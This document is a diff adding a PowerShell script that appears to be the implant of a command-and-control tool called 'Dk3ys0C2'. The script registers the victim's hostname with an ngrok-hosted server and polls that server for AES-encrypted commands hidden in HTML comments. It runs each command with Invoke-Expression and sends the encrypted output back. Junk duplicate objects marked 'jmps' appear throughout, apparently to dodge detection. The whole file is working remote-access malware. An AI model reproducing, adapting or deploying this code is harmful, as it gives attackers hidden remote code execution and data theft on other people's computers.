@@ -1,0 +1,173 @@
+#
+# Dk3ys0C2
+#
+
+$urlST = "https://95c2-83-50-163-145.ngrok-free.app" #"http://34.135.210.79"
+$RT_PTH_QRY = "/"
+$ST_PT_QRY = "/imges"
+$Q_S = "gdyellow="
+$STB = "oldcssss="
+$TM1 = 2
+$TM2 = 8
+$CPHR = "Dk3ys0c2S3curity007#Y3llowH@kC0mp@ny"
+
+
+function Crt-sMngdbjct($key, $IV) {
+    $EEaassMnged = New-Object "System.Security.Cryptography.AesManaged"
+    #jmps
+    $EEaassMnged1 = New-Object "System.Security.Cryptography.AesManaged"
+    $EEaassMnged2 = New-Object "System.Security.Cryptography.AesManaged"
+    #
+    $EEaassMnged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $EEaassMnged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $EEaassMnged.BlockSize = 128
+    $EEaassMnged.KeySize = 256
+    if ($IV) {
+        if ($IV.getType().Name -eq "String") {
+            $EEaassMnged.IV = [System.Convert]::FromBase64String($IV)
+        }
+        else {
+            $EEaassMnged.IV = $IV
+        }
+    }
+    if ($key) {
+        if ($key.getType().Name -eq "String") {
+            $EEaassMnged.Key = [System.Convert]::FromBase64String($key)
+        }
+        else {
+            $EEaassMnged.Key = $key
+        }
+    }
+    $EEaassMnged
+}
+function Crt-sKy() {
+    $EEaassMnged = Crt-sMngdbjct
+    $hshr = New-Object System.Security.Cryptography.SHA256Managed
+    #jmps
+    $hshr2 = New-Object System.Security.Cryptography.SHA256Managed
+    $hshr3 = New-Object System.Security.Cryptography.SHA256Managed
+    $hshr4 = New-Object System.Security.Cryptography.SHA256Managed
+    #
+    $tHsh = [System.Text.Encoding]::UTF8.GetBytes($CPHR)
+    $hshByts = $hshr.ComputeHash($tHsh)
+    $fnl = [System.Convert]::ToBase64String($hshByts)
+    return $fnl
+}
+function ncrpt-Strng($key, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $EEaassMnged = Crt-sMngdbjct $key
+    $ncrptr = $EEaassMnged.CreateEncryptor()
+    #jmps
+    $ncrptr2 = $EEaassMnged.CreateEncryptor()
+    $ncrptr3 = $EEaassMnged.CreateEncryptor()
+    $ncrptr4 = $EEaassMnged.CreateEncryptor()
+    #
+    $ncrptdDt = $ncrptr.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $fullData = $EEaassMnged.IV + $ncrptdDt
+    [System.Convert]::ToBase64String($fullData)
+}
+function Dcrpt-Strng($key, $encryptedStringWithIV) {
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $IV = $bytes[0..15]
+    $EEaassMnged = Crt-sMngdbjct $key $IV
+    $dcrptr = $EEaassMnged.CreateDecryptor();
+    #jmps
+    $dcrptr2 = $EEaassMnged.CreateDecryptor();
+    $dcrptr3 = $EEaassMnged.CreateDecryptor();
+    $dcrptr4 = $EEaassMnged.CreateDecryptor();
+    #
+    $unncrptdDt = $dcrptr.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    [System.Text.Encoding]::UTF8.GetString($unncrptdDt).Trim([char]0)
+}
+function rd_ntrvl {
+    Get-Random -minimum $TM1 -maximum $TM2
+}
+
+$ckicntnr = New-Object System.Net.CookieContainer
+#jmps
+$ckicntnr2 = New-Object System.Net.CookieContainer
+$ckicntnr3 = New-Object System.Net.CookieContainer
+#
+function connect-dky {
+    while ($True) {
+        $time = rd_ntrvl
+
+        try {
+            $HSTNM = "magic_hostname=$env:computername"
+            $key = Crt-sKy
+            $SNND = ncrpt-Strng $key $HSTNM
+            $s = [System.Text.Encoding]::UTF8.GetBytes($SNND)
+            $SNND = [System.Convert]::ToBase64String($s)
+            $r = [System.Net.HTTPWebRequest]::Create($urlST+$ST_PT_QRY+"?"+$Q_S+$SNND)
+            $r.CookieContainer = $ckicntnr
+            $r.Method = "GET"
+            $r.KeepAlive = $false
+            $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+            $r.Headers.Add("Accept-Encoding", "identity");
+            $resp = $r.GetResponse()
+            break
+        }
+        catch [System.Management.Automation.MethodInvocationException] {
+            Write-Host "[*] Cannot connect to '$urlST'" -Foreground Red
+            Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
+            sleep $time
+            Continue
+        }
+    }
+}
+
+connect-dky
+
+while ($True) {
+    $time = rd_ntrvl
+    try {
+        $r = [System.Net.HTTPWebRequest]::Create($urlST + $RT_PTH_QRY)
+        $r.CookieContainer = $ckicntnr
+        $r.Method = "GET"
+        $r.KeepAlive = $false
+        $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+        $r.Headers.Add("Accept-Encoding", "identity");
+        $resp = $r.GetResponse()
+        $reqstream = $resp.GetResponseStream()
+        $sr = New-Object System.IO.StreamReader $reqstream
+        $ENCRYPTEDSTREAMS = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STB"
+        $ENCRYPTED = $ENCRYPTEDSTREAMS -split("<!-- $STB")
+        $ENCRYPTED = $ENCRYPTED[1] -split(" --></body>")
+        $key = Crt-sKy
+        $DECRYPTED = Dcrpt-Strng $key $ENCRYPTED[0]
+        if ($DECRYPTED -eq "nothing"){
+            sleep $time
+        }
+        else{
+            if ($DECRYPTED -like $env:computername + "*"){
+                $DECRYPTED = $DECRYPTED -split($env:computername + "::::")
+                try {
+                    $RUN = "$DECRYPTED" | IEX -ErrorAction stop | Out-String
+                }
+                catch {
+                    $RUN = $_ | out-string
+                }
+                $RUN = ($env:computername + "::::" + $RUN)
+                $SNND = ncrpt-Strng $key $RUN
+                $s = [System.Text.Encoding]::UTF8.GetBytes($SNND)
+                $SNND = [System.Convert]::ToBase64String($s)
+                $r = [System.Net.HTTPWebRequest]::Create($urlST+$ST_PT_QRY+"?"+$Q_S+$SNND)
+                $r.CookieContainer = $ckicntnr
+                $r.Method = "GET"
+                $r.KeepAlive = $false
+                $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+                $r.Headers.Add("Accept-Encoding", "identity");
+                $resp = $r.GetResponse()
+                sleep $time
+
+            }
+        }
+    }
+    catch [System.Management.Automation.MethodInvocationException] {
+        Write-Host "[*] Cannot connect to '$urlST'" -Foreground Red
+        Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
+        sleep $time
+        connect-dky
+        Continue
+    }
+}
